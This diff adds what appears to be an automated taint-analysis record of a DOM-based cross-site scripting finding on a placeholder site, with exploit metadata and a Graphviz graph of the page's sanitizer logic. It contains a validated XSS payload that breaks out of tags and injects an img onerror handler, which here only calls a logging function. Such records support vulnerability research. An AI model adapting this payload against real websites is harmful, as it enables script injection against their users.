@@ -1,0 +1,113 @@
+// Finding: 0442a9ca-a499-4320-8dea-0a6d82467ac7
+// Finding.url: https://best.example362.com/youhui/10150334.html#ml%23ad%3D8513"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('763b61267ac24a418a05aa5fb39abb57')><!--/*
+// Finding.parentloc: https://best.example362.com/youhui/10150334.html#ml%23ad%3D8513"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('763b61267ac24a418a05aa5fb39abb57')><!--/*
+// Finding.domain: best.example362.com
+// Finding.base_domain: example362.com
+// Finding.source: location.href
+// Finding.sink: innerHTML
+// Sanitizer.score: 3
+// Sanitizer.name: initUI
+// Sanitizer.location: https://js.example363.com/pconline/2014/best/js/cmt.js - initUI:44:0
+// Finding.begin: 1864
+// Finding.end: 2117
+// Finding.original_uuid: 55c461ba-2405-477e-a21f-a89c6f71f79f
+// Finding.TwentyFiveMillionFlowsId: 1493183366
+// Finding.script: https://js.example363.com/min/temp/v1/lib-jquery1.4.2,dpl-jquery.slide.js
+// Finding.line: 33
+// Exploit.uuid: 763b6126-7ac2-4a41-8a05-aa5fb39abb57
+// Exploit.success: true
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: attribute
+// Exploit.content: onclick
+// Exploit.quote_type: "
+// Exploit.tag: a
+// Exploit.break_out: ml%23ad%3D8513"></iframe></style></script></object></embed></textarea><img src=x onerror=
+// Exploit.break_in: ><!--/*
+// Exploit.payload: ml%23ad%3D8513"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
+// Exploit.begin_taint_url: 0
+// Exploit.end_taint_url: 57
+// Exploit.replace_begin_url: 50
+// Exploit.replace_end_url: 57
+// Exploit.replace_begin_param: 1505
+// Exploit.replace_end_param: 1519
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: true
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: true
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: true
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: 1711353782
+// DepGraph.sanitizer_hash: 1112688534
+// Removed LR concats 
+// Removed LR concats 
+// Non Finite Regex with function on rhs:  replace((<([\w:]+)[^>]*?)\/>/g: 1, s: 0, u: 0, m: 0, i: 0 [escapes(), function_rhs: true], 'function(aZ,a0,aY){return al.test(aY)?aZ:a0+"></"+aY+">"}') - Left hand side has to be a range 
+// Approximated Implementation for:  replace((<([\w:]+)[^>]*?)\/>/g: 1, s: 0, u: 0, m: 0, i: 0 [escapes(), function_rhs: true], 'function(aZ,a0,aY){return al.test(aY)?aZ:a0+"></"+aY+">"}') - Left hand side has to be a range 
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="escape"];
+n2 [shape=box, label="Var: x"];
+n3 [shape=ellipse, label="."];
+n4 [shape=box, label="Lit: &amp;display=&amp;bind_url=//my.example362.com/passport/opens/open_bind.jsp?return="];
+n5 [shape=ellipse, label="."];
+n6 [shape=box, label="Lit: '" class="ttb"><i></i></a></span></span></td><td><div class="t....e="[亲]"></textarea></span></div></td></tr><tr><td colspan="2">"];
+n7 [shape=ellipse, label="."];
+n8 [shape=box, label="Lit: <table class="cmtFormInTable"><tr><td width="94" style="text-a....="JmainForm" data-event="detectLogin"></div></td></tr></table>"];
+n9 [shape=ellipse, label="."];
+n10 [shape=box, label="Lit: </td></tr><tr><td class="tCode"><span class="captcha_line" sty....e="发表评论" class="btn" name="Submit" /></td></tr></table></form>"];
+n11 [shape=ellipse, label="."];
+n12 [shape=box, label="Lit: <img class="cmt4_myface"  width="50" height="50" src="//i1.example363.com/images/upload/upc/face/0/0_100x100" />"];
+n13 [shape=ellipse, label="."];
+n14 [shape=box, label="Lit: </a><p><a target="_blank" href="//my.example362.com/setting/f...."captcha" type="text" class="tbxCode" title="5个字符 ~!.{5,5}" />"];
+n15 [shape=ellipse, label="."];
+n16 [shape=box, label="Lit: <img class="imgCode" width="95" height="22" />"];
+n17 [shape=ellipse, label="."];
+n18 [shape=box, label="Lit: <a class="nextCode" href="javascript:;">看不清，换一张</a></span></td....<input type="submit" value="发表评论" class="btn" name="Submit" />"];
+n19 [shape=ellipse, label="."];
+n20 [shape=box, label="Lit: </td></tr></table></form>"];
+n21 [shape=ellipse, label="preg_replace"];
+n22 [shape=box, label="RegExp: /(<([\w:]+)[^>]*?)\/>/"];
+n23 [shape=box, label="Lit: "];
+n24 [shape=box, label="Var: x"];
+n25 [shape=box, label="Var: x"];
+n26 [shape=doubleoctagon, label="Return: x"];
+n2 -> n0;
+n1 -> n2;
+n3 -> n1;
+n3 -> n4;
+n5 -> n3;
+n5 -> n6;
+n7 -> n5;
+n7 -> n8;
+n9 -> n7;
+n9 -> n10;
+n11 -> n9;
+n11 -> n12;
+n13 -> n11;
+n13 -> n14;
+n15 -> n13;
+n15 -> n16;
+n17 -> n15;
+n17 -> n18;
+n19 -> n17;
+n19 -> n20;
+n24 -> n19;
+n21 -> n22;
+n21 -> n23;
+n21 -> n24;
+n25 -> n21;
+n26 -> n25;
+}
